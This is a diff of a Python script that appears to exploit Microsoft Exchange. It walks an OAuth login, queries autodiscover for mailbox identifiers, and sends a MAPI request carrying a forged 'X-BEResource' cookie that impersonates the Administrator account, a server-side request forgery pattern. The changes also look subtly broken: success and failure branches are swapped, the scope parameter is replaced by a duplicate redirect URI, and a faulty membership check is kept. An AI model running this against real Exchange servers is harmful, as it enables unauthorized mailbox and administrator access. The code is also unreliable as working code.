@@ -152,14 +152,14 @@ while True:
 
     if b'error' in rp.content:
         print('Error!  Invalid Correlation ID!')
-        pass
+        break
     else:
         print('===================================================================================================')
         print(rp.url)
         print(rp)
         print('===================================================================================================')
         print(rp.content)
-        break
+        pass
 
     time.sleep(3)
     
@@ -225,14 +225,14 @@ while True:
 
     if b'Sorry' in rp.content:
         print('Invalid request! Could not sign in!')
-        pass
+        break
     else:
         print('===================================================================================================')
         print(rp.url)
         print(rp)
         print('===================================================================================================')
         print(rp.content)
-        break
+        pass
 
     time.sleep(3)
 
@@ -264,7 +264,7 @@ while True:
     &client_info=1\
     &client-request-id=\
     &X-AnchorMailbox=%s
-    '''%(enc_redirect_uri, enc_scope, enc_code, clientId, enc_anchorMailbox)
+    '''%(enc_redirect_uri, enc_redirect_uri, enc_code, clientId, enc_anchorMailbox)
     
     headers = {'Host': 'login.microsoftonline.com',
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
@@ -289,14 +289,14 @@ while True:
     #page = BeautifulSoup(rp.content, 'html.parser')
     if b'error' in rp.content:
         print('Error!  Invalid Token!')
-        pass
+        break
     else:
         print('===================================================================================================')
         print(rp.url)
         print(rp)
         print('===================================================================================================')
         print(rp.content)
-        break
+        pass
 
     time.sleep(3)
 
@@ -377,16 +377,18 @@ while True:
             print(headers)
             print('=========================================================================================')
             print(rp.content)
-            break
+            pass
 
         else:
             print('Unauthorized!  Connection Failed!')
-            pass
+            break
 
         time.sleep(3)
 
         if 'X-Calculatedbetarget' in rp.headers and 'X-Feserver' in rp.headers:
             FQDN = rp.headers['X-Feserver']
+
+        username = str(uuid.uuid4())+'@'+str(uuid.uuid4())
 
         autoDiscovery = '''
             <xml version="1.0" encoding="utf-8"?>
@@ -436,10 +438,10 @@ while True:
         if rp.status_code != 200:
             print(rp.status_code)
             print("Autodiscover Error!")
-            exit()
+            break
         if "<UserDN>" and "<MailboxDN>" and "<ActiveDirectoryServer>" not in str(rp.content):
             print('Cannot get UserDN, MailboxDN, or ActiveDirectoryServer')
-            exit()
+            break
         
         userDn = str(rp.content).split("<UserDN>")[1].split(r'</UserDN>')[0]
         mailboxDn = str(rp.content).split('<MailboxDN>')[1].split(r'</MailboxDN>')[0]
@@ -447,7 +449,7 @@ while True:
         
         mapi_body = userDn+'@'+mailboxDn+'\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00'
 
-        headers = {'Cookie': 'X-BEResource=ldap://Administrator@%s:636/mapi/emsmdb?MailboxId=%s@%s&a=~1942062522' % (FQDN, userDn, mailboxDn),
+        headers = {'Cookie': 'X-BEResource=ldap://Administrator@%s:389/mapi/emsmdb?MailboxId=%s@%s&a=~1942062522' % (FQDN, userDn, mailboxDn),
         'Content-Type': 'application/mapi-http',
         'X-RequestType': 'Connect',
         'X-Clientinfo': '{'+str(uuid.uuid4())+'}',
@@ -455,11 +457,13 @@ while True:
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'}
 
         rp = requests.post('https://%s/owa/service.svc' % target,headers=headers, data=mapi_body, verify=True, timeout=10)
-        
+
 
     #Handle Exceptions
     except requests.ConnectionError as e:
         print(e)
+        break
 
     except requests.ConnectTimeout as t:
         print(t)
+        break
